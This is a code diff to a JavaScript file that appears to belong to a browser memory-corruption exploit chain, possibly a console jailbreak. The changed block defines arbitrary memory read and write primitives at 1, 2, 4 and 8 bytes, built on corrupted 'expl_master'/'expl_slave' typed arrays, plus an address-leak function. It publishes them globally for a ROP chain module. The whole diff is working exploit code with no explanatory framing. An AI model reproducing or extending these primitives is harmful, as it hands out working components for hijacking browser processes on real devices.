@@ -31,38 +31,74 @@ import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
 
-var p = {
-  leakval: function (obj) {
-    obj_slave.obj = obj;
-    return new int64(obj_master[4], obj_master[5]);
-  },
+ var prim = {
   write8: function (addr, value) {
-    expl_master[4] = addr.low;
-    expl_master[5] = addr.hi;
-    if (value instanceof int64) {
-      expl_slave[0] = value.low;
-      expl_slave[1] = value.hi;
-    } else {
-      expl_slave[0] = value;
-      expl_slave[1] = 0;
-    }
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+    expl_slave[1] = value.hi;
+   } else {
+    expl_slave[0] = value;
+    expl_slave[1] = 0;
+	
+   }
   },
   write4: function (addr, value) {
-    expl_master[4] = addr.low;
-    expl_master[5] = addr.hi;
-    if (value instanceof int64) {
-      expl_slave[0] = value.low;
-    } else {
-      expl_slave[0] = value;
-    }
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+   } else {
+    expl_slave[0] = value;
+   }
+  },
+  write2: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFF0000;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFFFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFFFF) | tmp);
+   }
+  },
+  write1: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFFFF00;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFF) | tmp);
+   }
   },
   read8: function (addr) {
-    expl_master[4] = addr.low;
-    expl_master[5] = addr.hi;
-    return new int64(expl_slave[0], expl_slave[1]);
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return new int64(expl_slave[0], expl_slave[1]);
+  },
+  read4: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0];
+  },
+  read2: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFFFF;
+  },
+  read1: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFF;
+  },
+  leakval: function (obj) {
+   obj_slave.obj = obj;
+   return new int64(obj_master[4], obj_master[5]);
   }
-};
-
+ };
+ window.p = prim;
 function array_from_address(addr, size) {
         var og_array = new Uint32Array(0x1000);
         var og_array_i = p.leakval(og_array).add32(0x10);
